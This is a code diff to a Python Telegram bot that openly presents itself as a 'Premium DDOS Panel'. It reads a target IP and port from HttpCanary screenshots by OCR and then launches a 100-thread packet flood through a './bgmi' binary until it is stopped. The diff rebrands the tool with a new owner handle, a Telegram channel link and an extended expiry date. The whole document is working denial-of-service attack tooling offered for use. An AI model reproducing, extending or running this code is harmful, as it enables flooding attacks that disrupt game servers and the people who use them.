@@ -21,9 +21,9 @@ from PIL import Image
 pytesseract.pytesseract.tesseract_cmd = "/usr/bin/tesseract"
 
 # 💣 Fixed Info (safe inside daku.py)
-OWNER_USERNAME = '@Thuanmodessp'
-CHANNEL_LINK = 'Thuandepzai'
-EXPIRY_DATE = datetime(2030, 8, 2)
+OWNER_USERNAME = '@DARINDAxOWNER'
+CHANNEL_LINK = 'https://t.me/+744pifuvw-o1ZTI9'
+EXPIRY_DATE = datetime(2085, 8, 2)
 
 def check_expiry():
     if datetime.now() > EXPIRY_DATE:
@@ -33,7 +33,7 @@ def check_expiry():
 def welcome_banner():
     banner = f"""
 ────────────────────────────────────────
-🔥 WELCOME TO Thuận VIP TOOL 🔥
+🔥 WELCOME TO DARINDA VIP TOOL 🔥
 
 💣 Premium DDOS Panel 💣
 🔒 Secure Access Only
@@ -54,7 +54,7 @@ def extract_ip_port_from_image(image: Image.Image):
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🤖 *DDoS Panel Bot by Thuận*\n\n"
+        "🤖 *DDoS Panel Bot by DARINDAxOWNER*\n\n"
         "📸 Please send a clear HttpCanary screenshot to automatically extract the IP and Port (Port must start with `100**`).\n\n"
         "⬇️ Once target is detected, use the buttons below to *start* or *stop* the attack.\n\n"
         "_Note: Buttons will always remain visible for easy control._",
@@ -100,9 +100,9 @@ async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         # No duration so runs until manually stopped
-        packet_size = 10025
+        packet_size = 10024
         threads = 100
-        command = ["./bgmi.py", ip, str(port), "9999", str(packet_size), str(threads)]
+        command = ["./bgmi", ip, str(port), "9999", str(packet_size), str(threads)]
 
         attack_process = subprocess.Popen(command)
 
@@ -133,4 +133,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
